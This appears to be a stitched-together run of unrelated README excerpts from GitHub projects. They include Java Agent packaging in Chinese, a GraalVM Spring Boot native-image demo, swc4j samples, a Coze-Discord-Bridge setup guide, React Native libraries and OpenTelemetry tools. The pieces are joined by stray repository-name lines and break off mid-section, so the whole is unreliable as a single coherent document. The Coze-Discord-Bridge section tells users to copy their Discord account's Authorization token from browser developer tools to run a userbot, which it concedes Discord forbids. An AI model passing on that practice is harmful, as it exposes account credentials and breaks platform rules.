这个 manifest 文件指定了 agent 类并启用了一些功能，如类的重定义和重转换。

现在，将 Java Agent 编译并打包成 JAR 文件。假设你的 Java 文件在 `src` 目录中，使用 `javac` 和 `jar` 命令，你可以这样做：

1. 编译 agent 类：

```sh
# javac -source 1.8 -target 1.8 -d . src/main/java/my/agent/SimpleAgent.java
```

2. 将编译后的类打包成带有 manifest 的 JAR 文件：

```sh
# jar cvfm SimpleAgent.jar MANIFEST.MF my/agent/SimpleAgent.class
added manifest
adding: my/agent/SimpleAgent.class(in = 492) (out= 320)(deflated 34%)
```

现在你有了一个可以作为 Java Agent 使用的 `SimpleAgent.jar`。要将这个 agent 附加到你的应用程序上，启动 Java 应用程序时使用 `-javaagent` 选项，将`SimpleAgent.jar`重命名到`./agent/agent.jar`

```sh
# mv SimpleAgent.jar ../agent/agent.jar
```

yubb-ai/unofficial-gpt4,main,"# Spring Boot Native Image Microservice

This demo shows how to build, package, and run a simple Spring Boot 3 microservice from a JAR file with the GraalVM JDK,
and from a native executable with GraalVM Native Image. The benefits of using a native executable are faster start-up
times and reduced memory consumption. It also demonstrates how to run the application and build the native executable
within a Docker container.

There are two ways to generate a native executable from a Spring Boot application:

- [Using GraalVM Native Build Tools](https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html#native-image.developing-your-first-application.native-build-tools)
- [Using Buildpacks](https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html#native-image.developing-your-first-application.buildpacks)

## Sample Application

The example is a minimal REST-based API application, built on top of Spring Boot 3. It consists of:

- `com.example.jibber.JibberApplication`: the main Spring Boot class. It is also a REST controller which serves as an
  entry-point for HTTP requests.
- `com.example.jibber.Jabberwocky`: a utility class that implements the logic of the application.

If you call the HTTP endpoint, `/jibber`, it will return some nonsense verse generated in the style of the Jabberwocky
poem, by Lewis Carroll. The program achieves this by using a Markov Chain to model the original poem (this is
essentially a statistical model). This model generates a new text. The example application provides the text of the
poem, then generates a model of the text, which the application then uses to generate a new text that is similar to the
original text. The application uses the [RiTa library](https://rednoise.org/rita/) as an external dependency to build
and use Markov Chains.

By default, the demo uses
the [Native Build Tools Maven plugin](https://graalvm.github.io/native-build-tools/latest/maven-plugin.html) to perform
the tasks. If you would like to run this demo
using [BuildPacks](https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html#native-image.developing-your-first-application.buildpacks),
the build configuration is provided for you too.

## Prerequisites

1. Download and install the latest GraalVM JDK using [SDKMAN!](https://sdkman.io/).
    ```bash
    sdk install java 21.0.2-graal
    ```

2. (Optional) Install and run a Docker-API compatible container runtime such
   as [Rancher Desktop](https://docs.rancherdesktop.io/getting-started/installation/), [Docker](https://www.docker.io/gettingstarted/),
   or [Podman](https://podman.io/docs/installation). If you are using Docker, configure it
   to [allow non-root user access](https://docs.docker.com/engine/install/linux-postinstall/#manage-docker-as-a-non-root-user)
   if you are on Linux.

3. Download the demos repository or clone it as follows:

    ```bash
    git clone https://github.com/graalvm/graalvm-demos
    ```

4. Change directory to the demo subdirectory:

    ```bash
    cd spring-native-image
    ```

## Application JAR

### Build and Run as a JAR

This demo is built using Maven.

1. Build the application on top of a JVM:

    ```shell
    ./mvnw clean package
    ```

   It generates a runnable JAR file that contains all of the application’s dependencies and also a correctly
   configured `MANIFEST` file.

2. Run the application JAR and put it into the background by appending `&`:

    ```shell
    java -jar ./target/benchmark-jibber-0.0.1-SNAPSHOT.jar &
    ```

3. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or call the endpoint
   using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

   It should generate a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

4. Bring the application to the foreground using `fg`, and then enter `<CTRL-c>` to terminate the application.

### (Optional) Containerize the JAR

The following steps (5-8) show how you can easily containerize the JAR built in the previous step using the Oracle
GraalVM JDK container image `container-registry.oracle.com/graalvm/jdk:17-ol8`.

5. Run this command to package the JAR as a Docker container:

    ```shell
    docker build -f Dockerfiles/Dockerfile.jvm --build-arg APP_FILE=benchmark-jibber-0.0.1-SNAPSHOT.jar -t jibber-benchmark:jvm.0.0.1-SNAPSHOT .
    ```

6. Run the container:

    ```shell
    docker run --rm --name graal -p 8080:8080 jibber-benchmark:jvm.0.0.1-SNAPSHOT
    ```

7. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or from a new
   terminal window, call the endpoint using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

   You should get a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

8. To stop the application, first get the container id using `docker ps`, and then run:

    ```shell
    docker rm -f <container_id>
    ```

## Native Executable

Recap what you have so far: built a Spring Boot application with an HTTP endpoint, and successfully containerised it.
Now you will look at how you can create a native executable from your application.

Spring Boot 3's built-in support for GraalVM Native Image makes it easy to compile a Spring Boot 3 application into a
native executable.

This native executable not only starts faster but also uses far fewer resources than running the application as a JAR
file.

You can use the `native-image` tool from the GraalVM installation to build a native executable.
In this example, you'll use
the [GraalVM Native Build Tools for Maven](https://graalvm.github.io/native-build-tools/latest/maven-plugin.html) to
build a native executable.

### Default Native Build Configuration

Make sure you’re using `spring-boot-starter-parent` in order to inherit the out-of-the-box `native` profile, and
the `org.graalvm.buildtools:native-maven-plugin` plugin.

You should see the following in the Maven `pom.xml` file:

``` xml
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>3.2.0</version>
    <relativePath/> <!-- lookup parent from repository -->
</parent>
```

``` xml
<build>
    <plugins>
        <plugin>
            <groupId>org.graalvm.buildtools</groupId>
            <artifactId>native-maven-plugin</artifactId>
        </plugin>
        ...
    </plugins>
</build>
```

The out-of-the-box `native` profile
has [GraalVM Reachability Metadata](https://www.graalvm.org/native-image/libraries-and-frameworks/) enabled by default.

### Build and Run as a Native Executable

With the out-of-the-box `native` profile active, you can invoke the `native:compile` goal to trigger native-image
compilation.

1. Run the following command:

    ```shell
    ./mvnw native:compile -Pnative
    ```

   The `native` profile is used to generate a native executable for your platform. The native executable is called
   _benchmark-jibber_ and is generated in the _target_ directory.

   > Alternatively, to build using BuildPacks, run the `./mvnw spring-boot:build-image -Pnative` command to generate a
   native executable. For more information about using BuildPacks to create a native executable,
   see [Building a Native Image Using Buildpacks](https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html#native-image.developing-your-first-application.buildpacks).

2. Run the native executable and put it into the background by appending `&`:

    ```shell
    ./target/benchmark-jibber &
    ```

3. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or call the endpoint
   using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

   You should get a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

4. Bring the application to the foreground using `fg`, and then enter `<CTRL-c>` to terminate the application.

From the log output, notice how much quicker the native executable version of this Spring Boot application starts
compared to the JAR. The native executable also uses fewer resources than running from a JAR file.

### Additional Native Build Configuration

Notice that you can pass additional configuration arguments to the underlying `native-image` build tool using
the `<buildArgs>` section. In individual `buildArg` tags, you can pass parameters exactly the same way as you do from a
command line. This lets you use all of the parameters that work with the `native-image` tool from Maven.

Add the following snippet to the pom.xml to pass additional arguments to enable verbose output, quick build mode, etc.
over and above the out-of-the-box `native` profile.

```xml
<profiles>
   <profile>
      <id>native</id>
      <build>
         <plugins>
            <plugin>
               <groupId>org.graalvm.buildtools</groupId>
               <artifactId>native-maven-plugin</artifactId>
               <!--<version>0.9.28</version>-->
               <configuration>
                  <verbose>true</verbose>
                  <quickBuild>true</quickBuild>
                  <buildArgs combine.children=""append"">
                     <arg>-H:+ReportExceptionStackTraces</arg>
                  </buildArgs>
               </configuration>
            </plugin>
         </plugins>
      </build>
   </profile>
</profiles>
```

### Build and Run as a Native Executable

Let's rebuild the native executable with the additional configuration arguments.

1. Run the following command:

    ```shell
    ./mvnw native:compile -Pnative
    ```

   With the quick build mode enabled, it takes less time to build the native executable. This mode should be used in
   development for faster builds.

2. Run the native executable and put it into the background by appending `&`:

    ```shell
    ./target/benchmark-jibber &
    ```

3. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or call the endpoint
   using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

   You should get a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

4. Bring the application to the foreground using `fg`, and then enter `<CTRL-c>` to terminate the application.

From the log output, notice how much quicker the native executable version of this Spring Boot application starts
compared to the JAR. The native executable also uses fewer resources than running from a JAR file.

### (Optional) Containerize the Native Executable on Linux

The following steps (5-8) are for Linux only.

5. On Linux, you can easily containerise the native executable using the following command:

    ```shell
    docker build -f Dockerfiles/Dockerfile.native --build-arg APP_FILE=benchmark-jibber -t jibber-benchmark:native.0.0.1-SNAPSHOT .
    ```

6. Run the application:

    ```shell
    docker run --rm --name native -p 8080:8080 jibber-benchmark:native.0.0.1-SNAPSHOT
    ```

7. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or from a new
   terminal window, call the endpoint using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

   It should generate a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

8. To stop the application, first get the container id using `docker ps`, and then run:

    ```shell
    docker rm -f <container_id>
    ```

### (Optional) Use Multistage Docker Builds to Build a Native Image and Package it in a Lightweight Container

The following steps (9-12) are for all platforms - MacOS, Windows, and Linux.

For MacOS and Windows, to build a Docker image containing your native executable, you need to build the native
executable inside a Docker container. To do this, we've provided
a [multistage Docker build file](./Dockerfiles/Dockerfile).

9. Run this command to build the native executable within a Docker container:

    ```shell
    docker build -f Dockerfiles/Dockerfile -t jibber-benchmark:native.0.0.1-SNAPSHOT .
    ```

10. Run the application:

    ```shell
    docker run --rm --name native -p 8080:8080 jibber-benchmark:native.0.0.1-SNAPSHOT
    ```

11. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or from a new
    terminal window, call the endpoint using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

    It should generate a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

12. To stop the application, first get the container id using `docker ps`, and then run:

    ```shell
    docker rm -f <container_id>
    ```

## Measure the Performance of the Application and Metrics

The Spring Actuator dependency has been added to the project, along with support for Prometheus. If you want to test the
performance of either the JVM version, or the native executable version of the application, you can make use of the
Prometheus support. If you are hosting the application locally, it is available on port 8080:

[http://localhost:8080/actuator/prometheus](http://localhost:8080/actuator/prometheus)

### Transpile

* Run the following Java code to transpile TypeScript to JavaScript.

```java
// Prepare a simple TypeScript code snippet.
String code = ""function add(a:number, b:number) { return a+b; }"";
// Prepare a script name.
URL specifier = new URL(""file:///abc.ts"");
// Prepare an option with script name and media type.
Swc4jTranspileOptions options = new Swc4jTranspileOptions()
        .setSpecifier(specifier)
        .setMediaType(Swc4jMediaType.TypeScript);
// Transpile the code.
Swc4jTranspileOutput output = new Swc4j().transpile(code, options);
// Print the transpiled code.
System.out.println(output.getCode());
```

* The transpiled JavaScript code and inline source map are as follows.

```js
function add(a, b) {
  return a + b;
}
//# sourceMappingURL=data:application/json;base64,...
```

### Sanitize

* Run the following Java code to sanitize the JavaScript code.

```java
JavetSanitizerStatementListChecker checker = new JavetSanitizerStatementListChecker();

// 1. Check if keyword const can be used.
String codeString = ""const a = 1;"";
checker.check(codeString);
System.out.println(""1. "" + codeString + "" // Valid."");

// 2. Check if keyword var can be used.
codeString = ""var a = 1;"";
try {
    checker.check(codeString);
} catch (JavetSanitizerException e) {
    System.out.println(""2. "" + codeString + "" // Invalid: "" + e.getMessage());
}

// 3. Check if Object is mutable.
codeString = ""Object = {};"";
try {
    checker.check(codeString);
} catch (JavetSanitizerException e) {
    System.out.println(""3. "" + codeString + "" // Invalid: "" + e.getMessage());
}
```

* The output is as follows.

```js
1. const a = 1; // Valid.
2. var a = 1; // Invalid: Keyword var is not allowed.
3. Object = {}; // Invalid: Identifier Object is not allowed.
```

首先你要在[Discord开发者平台](https://discord.com/developers/)创建一个Application

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/41310da4-5db7-46df-946d-de642b64f985)

点击Bot 然后获取Token 复制保存到其它地方

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/bf45bbd4-0039-4723-b781-38854b607bbc)

往下滑动 开启下面三个按钮 随后点击保存

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/dd4a278d-9bac-45b4-b871-f3c92a136172)

点击Oauth 勾选Bot 然后往下滑勾选Administrator (省事 如果注重安全性那么请确保 链接到Coze的bot能收发和编辑消息 链接到Coze-Discord-Birdge的bot能收发消息和创建删除子频道)

复制下方生成的URL

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/8bb919a9-0dd5-480e-8062-2733b5ef5084)
之后第二个Bot相同的操作 这样你就有了两个Token 两个URL

打开Discord App(网页版亦可) 创建一个服务器

然后依次打开两个URL 把两个bot都添加进服务器

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/1c72bf00-dfc7-48fe-adb8-fcfcbf05ad95)

点击左下角设置打开Discord设置

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/2310f3c6-1060-4b18-a026-0feaaf1a82e0)



之后登录[Coze AI Studio](https://www.coze.com/)创建一个Bot
![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/9de286bf-d6bd-43a4-a2a0-8566dd706d84)

之后可以配置Bot 添加插件(要能AI画图必须添加) 调整GPT设置之类的(Dialog round = 对话轮数  推荐拉满) 最后点击右上角Publish

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/cf33dfef-33f6-420c-8473-aecddb789432)

输入 Token 点击保存 然后Publish

ps:Changelog必填 随便写即可 如果你有强迫症的话那..不太建议..

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/f5b32f9e-8f9b-484a-afcd-7a935904dd45)

如果配置正确你应该能看到托管到Coze的机器人上线了

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/580a331d-713f-4686-961e-8c3169bcbee4)

下滑 找到高级设置 开启开发者模式

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/ca33a63f-6de7-44d5-b6bb-b13162712056)

点击左上角复制服务器ID

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/d84f4363-a0f6-4f05-abc8-798f5742794a)

点击右侧复制Bot 用户ID

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/9b560037-9d4d-4324-892d-dbb8bcc90bc3)

在Config中保存这两个ID

````
     ......
     #Coze Bot所处的服务器ID 打开Discord开发者模式 右键服务器复制过来即可
     Server_id: ""xxxxxx""
     #接入Coze的Bot id 邀请进服务器在用户列表右键 复制用户ID 过来即可
     CozeBot_id: ""xxxxxx""
     ......
````

回到Discord页面 按下F12打开浏览器开发者页面

点击网络(Network) 随便选择一个 复制请求头 Authorization

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/7d802fb5-4c62-458f-83da-c0b7770fd6d1)

保存到配置中
````
     ......
     #Discord user token
     #打开Discord(推荐注册小号 因为UserBot 本身Discord就禁止) 按下F12打开开发者模式
     #点进网络 随便选择一个 复制请求头中的 Authorization 粘贴在这里
     Token: ""xxxxxxxxxxxxxxx""
     ......
````
4.再次运行 `java -jar CozeDiscordBridge-xxxxxx.jar` 如下显示则正常  如果您是使用的是Windows且控制台编码为GBK 请先执行`chcp 65001`

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/803bfe60-39d5-42d5-b1b3-7aaf932a2808)

ps:第一次启动报错 `读取 cache_names.json 失败` 正常 直接忽略即可

5.最后可通过curl或者其它工具测试 如果服务器内你的账号自动向机器人提问 随后机器人回答就是部署成功

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/a87d04ac-5c52-4929-bb7c-ff62bd2fde65)

## (可选)keepalive

因为Discord/Coze问题 当bot很长时间不互动会离线 遇到这种情况需要去Coze手动重新登录 很麻烦

因此 你可以通过编辑配置开启keepalive功能

它可以自动与Coze托管的bot对话 当累计到一段时间bot没有被互动过

````
......
# Keepalive 通过定时与Coze托管的bot互动防止因为太久未发言而被强制下限
# 内置定时器执行周期 单位分钟  设置 0 关闭  关闭后也可以通过api调用keepalive
Keepalive_timer: 0
# 只有大于指定分钟未发言Coze托管的bot才执行keepalive 单位分钟
Keepalive_maxIntervalMinutes: 720
# keepalive发送消息所在频道
Keepalive_sendChannel: ""keepalive""
# keepalive发送消息内容
Keepalive_sendMessage: ""keepalive""
````

当关闭内置定时器时 你也可以通过访问终结点`/api/keepalive`来执行keepalive任务

JAgentSphere/bytebuddy-agent-demo,main,"# Agent-Demo

使用 Byte Buddy 和 Gradle 构建一个最简单的 Java Agent

Java Agent 的入口类是 `com.jas.agent.Main`

```java
public class Main {
    public static void premain(String args, Instrumentation inst) {
        launch(args, inst);
    }

    public static void agentmain(String args, Instrumentation inst) {
        launch(args, inst);
    }

    private static void launch(String args, Instrumentation inst) {
        System.out.println(""hello java agent"");
    }
}
```

提供 AgentBuilder 最简化便利测试的配置项

```java
AgentBuilder agentBuilder = new AgentBuilder.Default()
        .ignore(ElementMatchers.none()) // 忽略空，即允许 hook 所有类
        .with(AgentBuilder.RedefinitionStrategy.REDEFINITION) // 开启类被加载后也允许进行字节码修改
        .with(AgentBuilder.Listener.StreamWriting.toSystemError().withErrorsOnly()) // 字节码修改失败打印错误信息到控制台
        .with(AgentBuilder.Listener.StreamWriting.toSystemOut().withTransformationsOnly()) // 字节码修改成功也输出到控制台
        .with(new DumpClassListener()); // 字节码修改成功把类信息给报错到 weaving/classes 目录下

### Contributing

#### PR Guidelines
- All mixin methods and fields _**must**_ have a `cc_` prefix // todo automate this check in gh workflows.
- If a class is significantly modified with mixins, it _**must**_ have documentation explaining:
	- The original vanilla behaviour, can mention important fields/methods.
		- If the vanilla class has sufficient javadoc (through parchment), this can be skipped. Our javadoc should link to the parchment javadoc.
	- The goal of all mixins targeting the class.
- Any merged mixins _**must**_ have tests associated with them. 
	- If a mixin is ""untestable"" its test class should have a comment explaining *why* it's untestable. 
		- Optionally a to-do (project task? issue?) suggesting integration tests when possible.
	- All non-trivial mixins _**must**_ have a comment explaining their purpose.
	- _**Must**_ pass checkstyle.

## Installation

```bash
$ yarn add @swan-io/react-native-browser
# --- or ---
$ npm install --save @swan-io/react-native-browser
```

## Quickstart

```tsx
import { openBrowser } from ""@swan-io/react-native-browser"";
import { useCallback } from ""react"";
import { Button, SafeAreaView } from ""react-native"";
import parseUrl from ""url-parse"";

const App = () => {
  const handleOnPress = useCallback(() => {
    openBrowser(""https://swan.io"", {
      onClose: (url) => {
        if (url) {
          const { protocol, host, query } = parseUrl(url, true);
          const origin = `${protocol}//${host}`;

          if (origin === ""com.company.myapp://close"") {
            console.log(JSON.stringify(query, null, 2));
          }
        }
      },
    }).catch((error) => {
      console.error(error);
    });
  }, []);

  return (
    <SafeAreaView>
      <Button title=""Open browser"" onPress={handleOnPress} />
    </SafeAreaView>
  );
};
```

## API

### openBrowser(url: string, options: Options)

```tsx
import { openBrowser } from ""@swan-io/react-native-browser"";

openBrowser(""https://swan.io"", {
  animationType: """", // ""fade"" | ""slide"" (default to ""slide"")
  dismissButtonStyle: ""close"", // ""cancel"" | ""close"" | ""done"" (default to ""close"")
  barTintColor: ""#FFF"", // in-app browser UI background color
  controlTintColor: ""#000"", // in-app browser buttons color
  onOpen: () => {
    // fired on browser opened
    // useful to switch the StatusBar color, for example
  },
  onClose: (url) => {
    // fired on browser closed
    // url will be defined if the browser has been closed via deeplink
  },
}).catch((error) => {
  console.error(error);
});
```

> [!IMPORTANT]
> On Android, the Chrome app must be opened at least once for this to work — a step often overlooked when using emulators in development.

## Handle deeplinks

In order to receive deeplink on browser close event, you have to setup them first. We **highly** recommand defining a custom schema + url for this specific task. For example, `com.company.myapp://close`.

### On iOS

First, you need to **[enable react-native deeplinks support](https://reactnative.dev/docs/linking#enabling-deep-links)**. Then, edit your `Info.plist` file to add:

```xml
<key>CFBundleURLTypes</key>
<array>
  <dict>
    <key>CFBundleTypeRole</key>
    <string>Viewer</string>
    <key>CFBundleURLName</key>
    <string>com.company.myapp</string>
    <key>CFBundleURLSchemes</key>
    <array>
      <string>com.company.myapp</string>
    </array>
  </dict>
</array>
```

### On Android

Edit your `AndroidManifest.xml` to add ([more documentation](https://developer.android.com/training/app-links/deep-linking)):

```xml
<activity android:name="".MainActivity"">
  <intent-filter>
    <action android:name=""android.intent.action.VIEW"" />
    <category android:name=""android.intent.category.BROWSABLE"" />
    <category android:name=""android.intent.category.DEFAULT"" />
    <data android:scheme=""com.company.myapp"" android:host=""close"" />
  </intent-filter>
</activity>
```

> [!TIP]
> Once the redirect URL is visited (a `GET` hits your server), handle the result and perform a server redirect to `com.company.myapp://close?success=true` to close the browser (and pass any data back to your app using query params ✨).

## Run the example app

```bash
$ git clone git@github.com:swan-io/react-native-browser.git
$ cd react-native-browser/example

$ yarn install && yarn start
# --- or ---
$ npm install && npm run start
```

# Why you should switch to OpenTelemetry

If you are new to OpenTelemetry you might be thinking how is it better than the multitude of
existing telemetry implementations, many of which are already available or well established within
popular runtimes like Kubernetes, for example.

There are a number of advantages that OpenTelemetry offers compared to earlier telemetries:

- All signal types (`logs`, `metrics`, `traces` and `profiles`) are ***correlatable:***
  
  For exmpale - you can explore ***only*** the `logs` emitted inside a given (potentially failing) `span`.

  To see how `telemetry signal correlation` works - refer to the [OpenTelemetry for Developers, Data Engineers and Data Scientists](#opentelemetry-for-developers-data-engineers-and-data-scientists) examples section below.
- More precise timing:
  
  Unlike other telemetries, OpenTelemetry does not `pull` data, it `pushes` it. By avoiding the
  extra request needed to pull data - OpenTelemetry reports much more accurate timestamps of
  when `logs` or `spans` and other events where emitted, or `metrics` values were updated.
- Zero-code telemetry:
  
  You can add telemetry to your existing apps without any code modifications. If you're using
  popular frameworks - they already have OpenTelemetry instrumentation that will just work out
  of the box. See the [OpenTelemetry docs for your programming language.](https://opentelemetry.io/docs/languages/)

  Also, you do not need to implement special endpoints and request handlers to supply telemetry.
- No CPU overhead if telemetry is not emitted:
  
  When code instrumented with OpenTelemetry runs ***without*** a configured signals exporter
  (basically when it is disabled) - all OpenTelemetry API methods are basically empty.

  They do not perform any operations, thus not requiring any CPU. 
- Major companies already support OpenTelemetry:
  
  Large infrastructure providers - public clouds like Azure, AWS and GCP already seamlessly integrate their monitoring and observability services with OpenTelemetry.
  
  Instrumenting your code with OpenTelemetry means it can be monitored on any of them, without
  code changes.

If the above sounds convincing - keep reading through this document and explore the links in it.

# OpenTelemetry for Developers, Data Engineers and Data Scientists

We have prepared a few Jupyter notebooks that visually explore OpenTelemetry data that we collected from [a demo Astronomy webshop app](https://github.com/mishmash-io/opentelemetry-demos)
using the [Apache Parquet Stand-alone server](./server-parquet) contained in this repository.

> [!TIP]
> If you are the sort of person who prefers to learn by looking at **actual data** - start with the [OpenTelemetry Basics Notebook.](./examples/notebooks/basics.ipynb)

# When and where should you use the software in this repository

We, at [mishmsah io,](https://mishmash.io/) have been using OpenTelemetry for quite some time - recording telemetry from experiments, unit and integration tests - to ensure every new release
of software we develop is performing better than the last, and within reasonable computing-resource usage. (More on this [here.](https://mishmash.io/open_source/opentelemetry))

> [!TIP]
> OpenTelemetry is great for **monitoring software in production,** but we believe you should adopt it within your **software development process** too.

Having been through that journey ourselves, we've realised that success depends on strong analytics. OpenTelemetry provides a number of tools to [instrument your code](https://opentelemetry.io/docs/concepts/instrumentation/) to emit signals, and then to compose data transmission pipelines for these signals. And leaves it to you to decide what you ultimately want to do with your signals: where you want to store them depends on how you will work with them.

You can compose such pipelines for signals transmition using the [OpenTelemetry Collector,](https://opentelemetry.io/docs/collector/) which in turn uses a network protocol called [OTLP.](https://opentelemetry.io/docs/specs/otel/protocol/) At the end - you have to `terminate` the pipelines into an `observability (or OTLP) backend.`

As a network protocol, OTLP is great at reducing the number of bytes transmitted, keeping the throughput high with minimum overhead. It does this by heavily `nesting` its messages - to avoid
data duplication and take maximum advantage of `dictionary encodings` and data compression.

On the **analytics side** though - heavily nested structures are not optimal. A simple `count(*)` or
`sum()` query, done over millions of OTLP messages, will have to `unnest` each one of them. Every time you run that query.

And this is the second reason why we believe you might find the software here useful:

> [!TIP]
> When doing analytics on your observability data - you need a suitable data schema.
>
> The tools in this repository convert OTLP messages into a 'flatter' schema, that's more suitable
> for analytics.
>
> They preform transformations, **only once** - on **OTLP packet reception,** to minimize the overhead that would otherwise be incurred every time you run an analytics job or query.

Following are quick introductions of the individual software packages, where you can find more information.

> [!TIP]
> If you're wondering how to get your first OpenTelemetry data sets - check out [our fork of OpenTelemetry's Demo app.](https://github.com/mishmash-io/opentelemetry-demos)
>
> In there you will find complete deployments that will generate signals, save them and let you play with the data - by writing your own notebooks or creating
> Apache Superset dashboards.

# Artifacts

## Embeddable collectors

The base artifact - `collector-embedded` contains classes that handle the OTLP protocol (over both gRPC and HTTP).
- [README](./collector-embedded)
- [Javadoc on javadoc.io](https://javadoc.io/doc/io.mishmash.opentelemetry/collector-embedded)

## Apache Parquet Stand-alone server

This artifact contains a runnable OTLP-protocol server that receives signals from OpenTelemetry and saves them into [Apache Paruqet](https://parquet.apache.org/) files.

It is not intended for production use, but rather as a quick tool to save and explore OpenTelemetry data locally. [The Basics Jupyter Notebook](./examples/notebooks/basics.ipynb) explores
Parquet files as saved by this Stand-alone server.
- [README](./server-parquet)
- [Javadoc on javadoc.io](https://javadoc.io/doc/io.mishmash.opentelemetry/server-parquet)
- [Quick deployment with a demo app](https://github.com/mishmash-io/opentelemetry-demos)

## Apache Druid OTLP Input Format

Use this artifact when ingesting OpenTelemetry signals into [Apache Druid](https://druid.apache.org), in combination with an Input Source (like Apache Kafka or other).

Apache Druid is a high performance, real-time analytics database that delivers sub-second queries on streaming and batch data at scale and under load. This makes it perfect for OpenTelemetry data analytics.

With this OTLP Input Format you can build OpenTelemetry ingestion pipelines into Apache
Druid. For example:
- Use the [OpenTelemetry Kafka Exporter](https://github.com/open-telemetry/opentelemetry-collector-contrib/blob/main/exporter/kafkaexporter/README.md) to publish
OTLP signals to an Apache Kafka topic, then the [Druid Kafka Ingestion](https://druid.apache.org/docs/latest/ingestion/kafka-ingestion/) with this Input Format to get Druid
tables with your telemetry.
- In a similar way you can also use other Druid input sources developed by mishmash io -
like with [Apache BookKeeper](https://bookkeeper.apache.org) or [Apache Pulsar](https://pulsar.apache.org). For details - check the related artifact documentation.

Find out more about the OTLP Input Format for Apache Druid:
- [README](./druid-otlp-format)
- [Javadoc on javadoc.io](https://javadoc.io/doc/io.mishmash.opentelemetry/druid-otlp-format)
- [Quick deployment with a demo app and Apache Superset](https://github.com/mishmash-io/opentelemetry-demos)

## Apache Superset charts and dashboards

![superset-dashboard](https://github.com/user-attachments/assets/8dba1e13-bcb3-41c9-ac40-0c023a3825c8)

[Apache Superset](https://superset.apache.org/) is an open-source modern data exploration and visualization platform.

You can use its rich visualizations, no-code viz builder and its powerful SQL IDE to build your own OpenTelemetry analytics.

To get you started, we're publishing [data sources and visualizations](./superset-visualizations) that you can import into Apache Superset.

# OpenTelemetry at mishmash io

OpenTelemetry's main intent is the observability of production environments, but at [mishmash io](https://mishmash.io) it is part of our software development process. By saving telemetry from  **experiments** and **tests** of 
our own algorithms we ensure things like **performance** and **resource usage** of our distributed database, continuously and across releases.

We believe that adopting OpenTelemetry as a software development tool might be useful to you too, which is why we decided to open-source the tools we've built.

Learn more about the broader set of [OpenTelemetry-related activities](https://mishmash.io/open_source/opentelemetry) at
[mishmash io](https://mishmash.io/) and `follow` [GitHub profile](https://github.com/mishmash-io) for updates and new releases.

# xtrspc: Android APK Comparison Tool

xtrspc is an APK designed for comparing two Android APK files. It decomposes the APKs, identifies added, removed, modified, and unchanged files, generates a detailed comparison result, and extracts relevant data into separate ZIP files. This tool aids in understanding the differences between two APKs and can be useful for version control or security analysis.

**Usage:**  
Fill the first EditText with Original APK path  
Fill the second EditText with Modified APK path  

Output the comparison result:  
/sdcard/data/xtrspc  

**Features:**
- Decompile APKs using apktool  
- Identify added, removed, modified, and unchanged files  
- Generate a detailed comparison result in a text file  
- Extract and compress important data based on the comparison result  

**Note:**  
Remember to grant all required permission.  
If somehow it keeps resulting an error saying some command (example: apktool) is not exists, you could try to input this command ```!reinstall``` on the first EditText and press the **COMPARE APK** button.

A react native vision camera frame processor for cropping

[Demo video](https://github.com/tony-xlh/vision-camera-cropper/assets/5462205/81031752-4179-4439-a8c6-97f73587fd56)


## Versions

For Vision Camera v3, use versions 0.x.

For Vision Camera v4, use versions >= 1.0.0.

## Installation

```sh
yarn add vision-camera-cropper
cd ios && pod install
```

Add the plugin to your `babel.config.js`:

```js
module.exports = {
   plugins: [['react-native-worklets-core/plugin']],
    // ...
```

> Note: You have to restart metro-bundler for changes in the `babel.config.js` file to take effect.

## Usage

1. Crop a frame and return its base64 or path.
      
    ```js
    import { crop } from 'vision-camera-cropper';

    // ...
    const frameProcessor = useFrameProcessor((frame) => {
      'worklet';
      //coordinates in percentage
      const cropRegion = {
        left:10,
        top:10,
        width:80,
        height:30
      }
      const result = crop(frame,{cropRegion:cropRegion,includeImageBase64:true,saveAsFile:false});
      console.log(result.base64);
    }, []);
    ```

2. Rotate an image.

    ```js
    const rotated = await rotateImage(base64,degree);
    ```

## Get Bitmap/UIImage via Reflection

If you are developing a plugin to get the camera frames, you can use reflection to get it as Bitmap or UIImage on the native side.

Java:

```java
Class cls = Class.forName(""com.visioncameracropper.CropperFrameProcessorPlugin"");
Method m = cls.getMethod(""getBitmap"",null);
Bitmap bitmap = (Bitmap) m.invoke(null, null);
```


Objective-C:

```objc
